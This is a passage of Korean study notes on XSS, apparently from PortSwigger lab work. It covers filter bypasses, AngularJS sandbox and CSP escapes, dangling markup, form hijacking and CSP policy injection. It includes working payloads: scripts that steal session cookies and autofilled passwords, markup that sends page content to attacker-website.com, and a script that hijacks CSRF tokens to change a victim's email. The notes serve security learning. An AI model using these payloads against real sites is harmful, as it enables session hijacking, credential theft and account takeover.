- 결과: `\\';alert(document.domain)//`, 여기서는 맨 앞의 `\`가 두번째의 `\`를 텍스트로 취급하는 기능을 하기 때문에 `'`에는 적용되지 않음. 


##### 에러 처리를 활용

만약 `(`, `)` 같은 특정 문자가 차단된 경우, 자바스크립트의 에러 처리 원리를 이용해서 우회할 수 있음. 

자바스크립트의 에러 처리 원리: 자바스크립트에는 코드 실행 중 에러가 발생했을 때 이를 감지하고 처리하는 `window.onerror`(전역 에러 핸들러)라는 기본 기능이 있음. 에러가 발생하면 브라우저는 자동으로 이 핸들러를 호출하며, **발생한 에러의 값을 함수의 첫 번째 인자로 전달**하는 규칙을 가지고 있음.

공격 스크립트: `onerror=alert;throw 1`
- `window.onerror`를 해커가 원하는 `alert` 함수로 변경
- `throw 1`으로 에러를 발생시키면 현재 에러 처리 담당 함수인 `alert` 함수가 1을 넘겨 받고 실행함. 


**예시**
뒤로 가기 버튼이 이런 코드로 되어있고 `(`, `)`, `;` 같은 일부 문자를 서버에서 막아둔 경우
``` html 
<!-- /post?postId=3 -->
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3).finally(_ => window.location = '/')">Back to Blog</a>
```

공격 스크립트 
``` url
/post?postId=3&test='},x=x=>{throw/**/onerror=alert,137},toString=x,window+'',{x:'
```

결과 코드 
``` html
<a href="javascript:fetch('/analytics', {method:'post', body:'/post?postId=3&test='}, x=x=>{throw/**/onerror=alert,137}, toString=x, window+'', {x:''}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```
- `&`: 새로운 쿼리 파라미터를 만들고 거기서 공격 스크립트를 작성함. `postId`에서 공격 스크립트를 작성하면 없는 `postId`라고 에러가 발생함. 
- `)`로 괄호를 닫아서 `fetch` 함수를 끝낼수 없기 때문에 `'}`로 `body` 객체만 닫음. 
- `x=x=>{공격코드}`: 자바스크립트의 화살표 함수는 매개변수가 1개일때 괄호를 생략할 수 있음. 
	- `;`가 막혀있기 때문에 `throw/**/onerror=alert,137`와 같이 순서를 해야함. 자바스크립트에서의 `,`는 왼쪽부터 차례대로 코드를 실행하는데 가장 마지막에 있는 값을 최종 결과로 반환하라는 특수한 기능을 가짐. 
- `/**/`: `throw`랑 `onerror` 사이의 띄어쓰기를 방화벽이 막아버리기 때문에 자바스크립트에서 아무 의미 없이 건너뛰는 다중행 주석을 띄어쓰기 대신 사용
- `toString=x`: `toString` 함수를 아까 만든 함수 x를 지정하고 `window+''`를 읽음으로써 `toString`이 실행되도록 함. 
- `{x:'`: 문법 에러를 막기 위해서 나머지 `'}`랑 짝을 맞춰줌. 


##### HTML 인코딩 활용

XSS 컨텍스트가 HTML 속성 내의 이벤트 핸들러인 경우, HTML 인코딩을 활용해서 필터를 우회할 수 있음. 
예: `<a href="javascript:..." onclick="var input='&apos;-alert(1)-&apos;';">`

1. HTML 파서의 작업 (HTML 디코딩): 브라우저가 처음 HTML을 읽을 때 `onclick` 속성 안에 있는 `&apos;`를 실제 작은따옴표(`'`)로 디코딩함. 
	- 결과: `var input=''-alert(1)-'';`
	- `<p>&lt;script&gt;</p>` 같은 경우에도 `<script>`로 디코딩이 되기는 하지만 이미 일반 텍스트 구간에 들어왔기 때문에 이를 새로운 HTML으로 해석하지는 않음. 

2. 자바스크립트 엔진으로 전달: 사용자가 버튼을 클릭하면, 브라우저는 방금 1단계에서 디코딩을 마친 코드(`var input=''-alert(1)-'';`)를 자바스크립트 엔진으로 넘김.
    
3. 자바스크립트 실행 (공격 성공): 자바스크립트 엔진이 코드를 받고 새로 읽는데 정상적인 따옴표(`'`)가 들어있고 문자열이 닫히면서 `-alert(1)-` 이라는 수식이 실행됨.


##### JavaScript 탬플릿 리터럴

자바스크립트 템플릿 리터럴(백틱)에서는 `${}`를 통해서 자바스크립트를 실행시킬 수 있음. 
``` js
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

따라서 XSS 컨텍스트가 자바스크립트 템플릿 리터럴인 경우에는 `${}`를 주입해서 공격이 가능함.
``` js
<script>
...
var input = `공격 스크립트`;
...
</script>
```


#### 클라이언트 측 템플릿 삽입

##### 클라이언트 측 템플릿

브라우저(클라이언트)가 HTML의 뼈대(템플릿)를 가지고 서버로부터 받은 데이터(JSON 등)를 브라우저 내에서 직접 결합해 화면을 그리는 구조

- **전통적인 서버 측 방식**
    - 사용자가 페이지를 요청하면 서버가 데이터베이스의 값과 템플릿(JSP, PHP, Jinja, Thymeleaf 등)을 조합해 **완성된 HTML 파일**을 만들어 브라우저로 보냄.
    - `[서버]` 데이터 + 템플릿 결합 $\to$ 완성된 HTML 전송 $\to$ `[브라우저]` 단순 출력

- **클라이언트 측 방식**
    - 브라우저는 정적인 템플릿(틀)과 자바스크립트 엔진을 먼저 로드함.
    - 이후 필요한 데이터만 서버에서 비동기(AJAX/Fetch)로 JSON 형태로 받아옴.
    - 브라우저의 자바스크립트 라이브러리가 템플릿의 변수 자리에 데이터를 채워 넣어 **DOM(화면)을 갱신**
    - `[서버]` 순수 데이터(JSON)만 전송 $\to$ `[브라우저]` 자바스크립트 엔진이 템플릿과 데이터를 직접 결합해 화면 구성

**예시**
``` html
<!-- 1. 화면 뼈대 (템플릿) -->
<div id="app">
  <h1>안녕하세요, {{ username }}님!</h1>
</div>

<!-- 2. 자바스크립트 로직 -->
<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
<script>
  Vue.createApp({
    data() {
      return { username: '불러오는 중...' };
    },
    async mounted() {
      // 1) 서버에 데이터 요청
      const res = await fetch('/api/user');
      const data = await res.json(); // 응답: { "username": "홍길동" }

      // 2) 변수에 값 대입 -> 화면의 {{ username }} 자리가 즉시 '홍길동'으로 바뀜
      this.username = data.username;
    }
  }).mount('#app');
</script>
```


##### 클라이언트 측 템플릿 삽입

페이지를 렌더링하는 동안, **프레임워크는 템플릿 표현식을 스캔하고, 발견된 모든 표현식을 실행**함. 공격자는 악성 템플릿 표현식을 제공하여 XSS 공격을 수행할 수 있음. 

**안전한 케이스: Fetch로 데이터를 받아올 때**
이때는 개발자가 미리 적어둔 `{{ username }}`이 브라우저에 먼저 도착함.

1. 초기 HTML 도착: 브라우저가 서버에서 `<h1> {{ username }} </h1>`이라는 고정된 코드를 받음.
2. 엔진 스캔: 템플릿 엔진이 화면을 쭉 읽고, "여기는 `username`이라는 변수가 들어갈 자리구나"라고 인식(컴파일)을 **끝냄.**
3. Fetch 요청: 자바스크립트가 서버에 데이터를 요청해 `{{7*7}}`이라는 텍스트를 받아옴.
4. 단순 텍스트 삽입: 엔진은 스캔이 이미 끝났기 때문에, 새로 들어온 `{{7*7}}`을 계산해야 할 코드로 보지 않고 **단순한 글자**로 취급하여 화면에 `{{7*7}}` 그대로 출력


**취약한 케이스: Fetch 없이 서버가 HTML에 직접 넣을 때**
이 상황에서는 HTML 파일 안에 `{{ username }}`이라는 개발자의 빈칸 자체가 없음. 사용자가 검색창에 입력한 `{{7*7}}`을 서버가 직접 HTML 뼈대에 직접 넣어서 응답하는 경우임.

``` js
const template = '<div>검색 결과: ' + userInput + '</div>';
```

1. 초기 HTML 도착: 서버(PHP, JSP 등)가 사용자의 검색어(`{{7*7}}`)를 HTML 문장에 그대로 이어 붙여서 브라우저로 보냄.
    - 브라우저가 받은 HTML: `<h1>검색 결과: {{7*7}} </h1>`
2. 엔진 스캔 (오해 발생): 이제 브라우저에서 템플릿 엔진이 켜져서 HTML을 쭉 읽음.
3. 계산 실행: 템플릿 엔진은 `<h1>` 태그 안에 있는 `{{7*7}}`을 발견함. **엔진은 이 글자가 방금 사용자가 입력한 데이터라는 사실을 전혀 모르고 7x7 연산을 실행함.** 


##### AngularJS 취약점

AngularJS: 클라이언트 측 템플릿을 사용하는 프레임워크 중 하나임.  

**AngularJS 샌드박스**
AngularJS의 샌드박스는 템플릿 표현식에서 위험한 객체, 속성으로의 접근을 차단하는 보안 환경임.
AngularJS 1.6 이전에는 샌드박스를 믿고 개발자가 사용자 입력을 템플릿(코드 뼈대) 자체에 직접 끼워 넣는 취약한 코드를 작성했음. 그래서 1.6 이후에 샌드박스를 아예 삭제해버렸고 그 이후에는 개발자가 취약한 코드를 작성하지 않음. 
1.6 이전 버전의 AngularJS를 사용하는 웹 애플리케이션에서는 샌드박스의 취약점을 이용한 공격이 아직 통함. 

**AngularJS 동작**

- `ensureSafeObject()`: 전역 객체 `window` 및 생성자 `Function` 객체 차단
- `ensureSafeMemberName()`: `__proto__` , `__lookupGetter__` 등 자바스크립트의 코어 시스템이나 상위 권한으로 거슬러 올라갈 수 있는 예약어 차단
- `ensureSafeFunction()`: 자바스크립트에서 실행 문맥을 바꾸거나 새로운 함수를 생성할 때 쓰이는 메서드(`call()`, `apply()`, `bind()`, `constructor()`)의 사용을 차단
- `isIdent()`: 자바스크립트 실행 코드를 `charAt()`을 사용해 검증

**AngularJS 샌드박스 우회 기법**

1. `charAt()` 전역 수정 (필수)
	- 상황: AngularJS 샌드박스는 `isIdent()` 함수를 활용해서 `{{}}`의 자바스크립트 코드를 검증하는데 이때 `charAt()`이 사용됨. 
	- 공격: `'a'.constructor.prototype.charAt=[].join`를 통해서 `charAt()`을 전역적으로 `join()`으로 수정
	- 예: `x=alert()` 공격 스크립트를 넣었을때 원래는 `charAt()`으로 한 글자씩 검증을 하지만 `join()`이 사용되므로 `'x0=0a0l0e0r0t0(010)'` 등으로 변환되어서 `isIdent()` 검증을 통과함. 

``` js
isIdent = function(ch) {
    return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$');
}
isIdent('x0=0a0l0e0r0t0(010)')
```


2. 문자열(따옴표) 필터링 우회
	- 상황: 웹사이트가 XSS 방어를 위해 `'`, `"` 입력을 차단한 경우
	- 공격: `String.fromCharCode()`를 사용하여 아스키코드(숫자)를 문자로 변환해 페이로드를 작성해야함. 
	- 샌드박스의 방어: AngularJS는 템플릿 내에서 전역 String 객체에 접근하는 것을 차단함. 
	- 우회: `'a'.constructor.fromCharCode()`로 우회 접근 (`constructor`은 부모 객체인 `String`을 의미함)
		- `'a'`와 같은 따옴표를 사용하지 못하는 경우, `{}.toString()`를 사용하면 문자열 `"[object Object]"`가 만들어짐. 

3. `$eval` 함수 필터링 우회
	- 상황: 공격 스크립트를 실행시켜야하는데 `$eval()` 함수가 정의되어 있지 않거나 막혀 있는 경우 
	- 공격: `[임의의 배열]|orderBy:'alert()'`
		- `|` 기호: AngularJS에서는 필터 전달 연산자
		- `orderBy` 필터: 원래는 객체를 정렬하는 데 사용하지만, 인자로 받은 문자열을 내부적으로 실행 가능함. 


**AngularJS CSP 우회**
콘텐츠 보안 정책(CSP)가 차단하는 핵심 요소 
- 인라인 스크립트 차단: HTML 내부에 직접 작성된 `<script>` 태그 차단 
- 외부 도메인 통제: 화이트리스트에 없는 외부 `.js` 파일 로드 차단
- 동적 코드 평가(Dynamic Evaluation) 차단: 자바스크립트의 `eval()`, `new Function()`(문자열을 기반으로 함수 동적 생성), `setTimeout('문자열')`처럼 **단순 텍스트(문자열)를 실행 가능한 코드로 번역해 주는 내장 함수들의 작동을 원천 차단**

``` html
<!-- 공격 스크립트 -->
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">

<!-- map()을 활용해 글자 수 줄이기-->
<input autofocus ng-focus="$event.path|orderBy:'[1].map(alert)'">
```
- `ng-focus="..."`: 포커스 되면 AngularJS의 `ng-focus` 기능이 발동하여 따옴표 안의 코드를 실행
- `$event.path` (window 객체 추출): 포커스 이벤트가 발생한 경로의 배열(`[input태그, ..., document, window]`)을 생성 (핵심은 배열 마지막에 위치한 `window` 객체)
- `| orderBy:`: 전달받은 `$event.path` 배열의 항목들을 하나씩 순회하며 뒤의 조건식을 적용
- `'[].constructor.from([1],alert)'`: `orderBy`가 순회하다가 마지막 `window` 객체를 만났을 때 이 코드가 평가됨. CSP는 문자열을 강제로 실행하는 행위를 막지만, 이 코드는 자바스크립트의 정상 내장 함수인 `Array.from`을 사용하는 합법적인 문법이므로 통과. 결과적으로 `window` 객체 위에서 `Array.from([1], alert)`가 작동하며 `window.alert(1)`이 실행됨.


### XSS 취약점 악용

#### 쿠키 탈취

XSS 공격으로 `document.cookie`를 이용하면 세션 쿠키를 훔칠 수 있음. 

**Burp collaborator 사용**
`fetch`로 자신의 서버에 `document.cookie`를 담아서 요청

**댓글로 쿠키 노출** 
`fetch`를 댓글을 작성하는 POST 요청을 보내서 노출 시키는 방법

``` js
// 1. formData 사용
var formData = new FormData();
formData.append('csrf', document.querySelector(".add-comment input").value);
formData.append('postId', '4');
formData.append('comment', document.cookie);
formData.append('name', 'leee');
formData.append('email', 'leee@gmail.com');

fetch('https://0a9d00f104d4603780a61213008600bb.web-security-academy.net/post/comment', {
	method: "POST",
	credentials: "same-origin",
	headers: {
		"Content-Type": "multipart/form-data; boundary=..."
	},
	body: formData
});

// 2. URLSearchParams 사용
fetch('https://0a720000039465d2815d4da20025002e.web-security-academy.net/post/comment', {
	method: "POST",
	credentials: "same-origin",
	headers: {
		"Content-Type": "application/x-www-form-urlencoded"
	},
	body: new URLSearchParams({
		csrf: document.getElementsByName("csrf")[0].value,
		postId: '4',
		comment: document.cookie,
		name: 'leee',
		email: 'leee@gmail.com'
	})
});
```
- `fetch`를 작성할때는 최소한으로만 작성 (여기서는 body 데이터만 필수)
	- `Content-Type` 생략 가능 (자동 추가)
	- `credentials: "same-origin"` 생략 가능 (기본값)
- `same-origin` 설정을 하면 쿠키 데이터는 자동으로 요청에 들어감. 
- DOM 선택 API 
	- `document.querySelector(".add-comment input").value`
	- `document.getElementsByName("csrf")[0].value`
	- `document.querySelector('input[name="csrf"]').value`
- DOM이 생기기 전에 해당 데이터에 접근하면 에러가 나기 때문에 `DOMContentLoaded` 사용
``` js
document.addEventListener("DOMContentLoaded", (event) => {
  console.log("DOM이 완전히 로드되고 파싱되었습니다");
  ...
});
```


**한계**
- 피해자가 로그인하지 않았을 수도 있음.
- 많은 애플리케이션은 JavaScript가 쿠키에 접근하지 못하도록 하기 위해 `HttpOnly`를 사용
- 세션은 사용자의 IP 주소와 같은 추가적인 요인으로 인해 차단될 수 있음. 
- 세션이 종료될 수 있으며, 이를 제어하기 전에 종료될 수도 있음.


#### 비밀번호 탈취

브라우저의 비밀번호 자동 완성 기능을 사용하는 사용자들의 비밀번호를 훔칠 수 있음. 

``` html
<form class="login-form" method="POST" action="/login">
    <label>Username</label>
	<input required="" type="text" name="username" autofocus="" >
	<label>Password</label>
	<input required="" type="password" name="password" 
		onchange="if(this.value.length) {
		    fetch('/post/comment', {
		        method: 'POST',
		        headers: {
			        'Content-Type': 'application/x-www-form-urlencoded'
		    },
		    body: new URLSearchParams({
			    csrf: document.getElementsByName('csrf')[0].value,
			    postId: '9',
			    comment: `${document.getElementsByName('username')[0].value}:${document.getElementsByName('password')[0].value}`,
			    name: 'leee',
			    email: 'leee@gmail.com'
		    })
	    });
	}">
    <button class="button" type="submit"> Log in </button>
</form>
```
- `/login` 페이지의 입력 태그들을 댓글 페이지에 넣어서 자동완성을 유도함. 그 후 DOM 선택자로 데이터를 가져옴. 
- 자동 완성이 되기 위해서는 `type`가 아이디에 사용되는 `text`, `email` 등이어야함. 존재하지 않는 `username`은 안될 확률이 높음. 
- 비밀번호 입력창에 `onchange` 이벤트로 값이 바뀌었을때 `fetch` 이벤트가 발생하도록 함. 


### 댕글링 마크업 삽입

일반적인 XSS 공격이 불가능한 경우 (JS 실행이 안됨.)
- `<script>` 태그 필터
- `onerror`, `onload` 등 이벤트 속성 필터: 태그를 만들어도 JS 실행 불가
- CSP(Content Security Policy): 인라인 스크립트, 외부 스크립트 로드 차단
- `javascript:` 차단: `<a href="javascript:...">` 실행 불가

`"`와 `>`는 필터링 되지 않은 경우 댕글링 마크업으로 우회할 수 있음. 


**공격 스크립트**: `"><img src='//attacker-website.com?`
``` html
<input type="text" name="input" value=""><img src='//attacker-website.com?"> [ 여기부터 응답 끝까지 전부 URL로 빨려들어감 ] '>
```

**HTML 파서의 동작**
1. `"><img src='//attacker-website.com?` 까지 읽음
2. `<img>` 태그의 `src` 속성이 `'`로 시작했는데, 닫는 `'`가 아직 없음
3. 브라우저는 **닫는 `'`를 찾을 때까지 계속 앞으로 읽음**
4. 그 사이에 있는 **모든 텍스트가 `src` URL의 일부로 취급**됨
5. 결국 `src='//attacker-website.com?....나머지 응답 전체....'` 가 되어 브라우저가 공격자 서버로 이미지 요청을 보냄 → URL에 **응답의 나머지 부분이 쿼리스트링으로 들어감**

`<img src>`를 가장 많이 사용함. 
- CSP가 `<img src>`를 허용하는 경우가 많음. 
- `'`가 없어도 뒤에 내용을 전부 URL로 넣음. 
- 요청 자체가 목적이라서 로드 실패해도 상관없음. 

참고: 속성이 닫히지 않고 매달려 있어서 **댕글링(dangling, 매달린)** 이라고 함. 

**한계**
CSP에서 `img-src 'self'`(외부 이미지 로드 불가) 설정 (일부 공격 방어)


### 폼 하이재킹 

폼 내부에서 `<button>` 태그의 `formaction` 속성을 사용하면 기존 `/action` 경로가 아닌 다른 경로로 요청을 보내도록 할 수 있음. 
XSS 공격으로 **`<button formaction=...>`를 주입하면 폼 요청을 가로채 csrf 같은 민감한 정보를 훔쳐올 수 있음.** 

공격 페이로드: `?email="><button class=button formaction=https://exploit-server.net/exploit formmethod=get type=submit>Click me</button>`

결과: 기존 폼 데이터를 훔쳐올 수 있음. 
``` html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="blah@blah"><button class=button formaction=https://exploit-server.net/exploit formmethod=get type=submit>Click me</button>">
    <input required type="hidden" name="csrf" value="60gCEToAWJNmzpMK7WTBxMEo6U3MWU2K">
    <button class='button' type='submit'> Update email </button>
</form>
```


**예시**
이메일 변경 폼에서 폼 하이재킹을 이용해서 csrf 토큰을 훔쳐 피해자의 이메일을 변경할 수 있음. 

``` html
<!-- 해커 서버 exploit-123.exploit-server.net/exploit 응답 내용 설정-->
<body>
<script>
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// csrf 토큰이 잇는 경우, 이메일 변경 POST 요청
if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;

    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `https://your-lab-url.net/my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
    
// csrf가 없는 경우, csrf를 훔치기 위해서 폼 하이재킹 시도
} else {
    location = `https://your-lab-url.net/my-account?email=foo@bar"><button type="submit" formaction="https://exploit-123.exploit-server.net/exploit" formmethod="get">Click me</button>`;
}
</script>
</body>
```

##### form.submit()

`<form>` 태그 
``` html 
<form action="/submit" method="post">
  <input name="email" value="test@test.com">
  <input name="csrf" value="abc123">
  <button type="submit">제출</button>
</form>
```
- 폼 안의 모든 input 값을 모음 (`email=test@test.com&csrf=abc123`)
- `action` URL로 HTTP 요청 전송 (여기선 POST)
- **응답을 새 페이지로 표시**

`form.submit()`: `<form>` 태그의 동작을 JS로 실행하는 것
``` js
const form = document.createElement('form');  // 폼 요소 생성
// ... input 추가, action/method 설정 ...
document.body.append(form);   // DOM에 붙임
form.submit();                 // ← 제출 버튼 클릭한 것과 동일
```

**`fetch`와 차이**
- 쿠키는 현재 페이지 도메인이 아니라 **요청을 보내는 대상 도메인**에 따라 붙음.
- `form.submit()`은 **페이지 이동(navigation)** 이라서, 브라우저가 사용자가 직접 해당 페이지에 가는 것과 동일하게 취급하므로 쿠키 자동 포함

| 요청 방식                               | cross-origin 쿠키 |
| ----------------------------------- | --------------- |
| `form.submit()` (navigation)        | ✅ **자동 포함**     |
| `fetch()` (기본값)                     | ❌ 안 실림          |
| `fetch({ credentials: 'include' })` | ✅ 실림            |


### 콘텐츠 보안 정책 CSP

CSP는 **브라우저 보안 메커니즘**으로 XSS 및 기타 공격을 방지해줌.  
- 페이지가 로드할 수 있는 리소스(예: 스크립트, 이미지)를 제한
- 다른 사이트에서 페이지를 `<iframe>` 등으로 보여주는 것을 제한 
`Content-Security-Policy` HTTP 헤더에 정책을 지정해서 응답하면 브라우저에서 적용해줌.
HTTP 헤더에 담겨있기 때문에 개발자도구 - 네트워크 탭에서 확인 가능


#### CSP의 XSS 공격 완화

``` http
// 페이지와 동일한 출처(웹사이트 서버)에서 제공하는 스크립트만 로드 허용
Content-Security-Policy: script-src 'self'
// 특정 도메인에서만 스크립트 로드 허용
Content-Security-Policy: script-src https://scripts.normal-website.com
```
- `script-src`는 기본적으로 인라인 스크립트의 실행도 차단함. 
- 인라인 스크립트를 넣어야하는 경우에는 난수나 해시 기능 사용

**난수 설정** 

``` http
Content-Security-Policy: script-src 'nonce-a1b2c3d4e5f6'
```

``` html
<script nonce="a1b2c3d4e5f6">
  console.log("이 스크립트는 실행됨");
</script>

<script>
  alert("nonce가 없으므로 차단됨");
</script>
```
1. CSP 헤더에서 허용된 nonce 값을 읽음. 
2. 페이지 내 모든 `<script>` 태그에서 nonce 속성 값이 일치하는 스크립트만 실행하고 나머지는 차단함. 

**해시 설정**

``` http
Content-Security-Policy: script-src 'sha256-abc123...'
```

``` html 
<script>
  console.log("이 스크립트는 실행됨");
</script>
```
1. CSP 헤더에서 허용된 해시 값을 읽음. 
2. 페이지 내 모든 `<script>` 태그 내용을 해싱해서 일치하는 스크립트만 실행하고 나머지는 차단함. 


#### 사용자 상호 작용을 통한 우회

CSP는 자동으로 실행되는 코드(스크립트, 이미지 로드, fetch 등)들을 제한하는 데 초점이 맞춰져 있기 때문에 사용자 상호 작용(예: 클릭)을 통해 CSP를 우회할 수 있음.  
예: [[#폼 하이재킹]]


#### CSP 정책 주입을 통한 우회

`report-uri`: CSP 위반이 발생했을 때, 브라우저가 위반 내용을 POST로 보내도록 하는 지시문 
- URL을 값으로 받음.
- 관례적으로 CSP 목록 마지막에 위치함. 
- CSP 위반을 추적하기 위해 사용자의 입력을 넣는 경우가 많음. 

``` http
// CSP 위반이 발생하면 /csp-report로 위반 내용을 요청 보냄. 
Content-Security-Policy: script-src 'self'; report-uri /csp-report?url=<사용자입력>
```

``` python
# 서버 코드 (의사 코드)
user_input = request.args.get('ref')  # 사용자가 보낸 ref 파라미터
csp_header = f"script-src 'self'; report-uri /csp-report?url={user_input}"
response.headers['Content-Security-Policy'] = csp_header
```


**공격 흐름**
1. 공격자가 악의적인 URL을 피해자에게 보냄
	- `https://공격사이트.com/page?ref=foo;script-src-elem 'unsafe-inline'`
2. 피해자가 URL을 방문
	- 이때 `ref` 값이 `foo;script-src-elem 'unsafe-inline'`임. 
3. 서버가 응답을 생성: `ref` 값을 그대로 `report-uri`에 넣음
``` http 
...
Content-Security-Policy: script-src 'self'; report-uri /csp-report?url=foo;script-src-elem 'unsafe-inline'
```
4. 브라우저가 해당 `script-src-elem` CSP를 적용
5. 공격 성공


| 지시문               | 제어 대상                                                    |
| ----------------- | -------------------------------------------------------- |
| `script-src`      | `<script>` 요소 + 이벤트 핸들러 + `javascript:` URL 등 모든 스크립트 실행 |
| `script-src-elem` | `<script>` 요소만 제어                                        |
| `script-src-attr` | 이벤트 핸들러와 `javascript:` URL만 제어                           |
- `script-src-elem`이 있으면 → `<script>` 요소에 대해서는 **`script-src-elem`이 `script-src`를 덮어씀**
- `script-src-attr`이 있으면 → 이벤트 핸들러에 대해서는 **`script-src-attr`이 `script-src`를 덮어씀**
- 해당 지시문이 없으면 → `script-src`가 대신 적용됨

